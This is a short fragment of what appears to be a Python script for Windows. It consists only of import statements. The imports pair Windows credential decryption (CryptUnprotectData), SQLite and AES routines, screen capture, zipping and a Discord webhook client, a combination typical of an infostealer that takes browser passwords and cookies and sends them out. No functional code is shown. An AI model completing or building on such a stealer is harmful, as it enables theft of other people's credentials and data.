import os, base64, shutil, requests, json, re, winshell, platform, psutil, subprocess, win32api, sys, ctypes
import getpass;user=getpass.getuser()
from json import loads
from time import sleep
from win32crypt import CryptUnprotectData
from sqlite3 import connect
from Crypto.Cipher import AES
from threading import Thread
from zipfile import ZipFile
from PIL import ImageGrab
from random import randint
from discord_webhook import DiscordWebhook, DiscordEmbed
from winreg import OpenKey, HKEY_CURRENT_USER, EnumValue
